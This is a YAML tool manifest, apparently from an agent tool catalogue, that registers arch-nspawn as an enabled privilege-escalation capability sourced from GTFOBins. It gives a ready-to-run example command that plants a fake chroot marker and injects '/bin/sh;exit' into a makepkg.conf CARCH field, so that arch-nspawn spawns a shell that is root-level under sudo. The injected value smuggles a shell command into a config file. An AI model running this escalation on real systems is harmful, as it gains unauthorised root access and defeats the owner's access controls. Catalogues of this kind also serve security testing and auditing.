---
id: system-container-arch-nspawn
namespace: system:container:arch-nspawn
name: arch-nspawn
description: Spawn a shell in an Arch Linux chroot container, can be used for privilege escalation via sudo.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
  - arch-nspawn
  - Bash
  - execFile
parameters:
  - name: args
    type: string
    required: false
    description: "Arguments to arch-nspawn"
features:
  - process-manip
execution:
  template: "arch-nspawn {args}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn an interactive shell via arch-nspawn
    command: |
      mkdir -p ./etc/ && grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot && touch ./etc/pacman.conf && echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf && arch-nspawn .
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/arch-nspawn/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "devtools"
    commands:
      - "apt-get install -y devtools"
  - method: pacman
    package_name: "devtools"
    commands:
      - "pacman -S devtools"
---
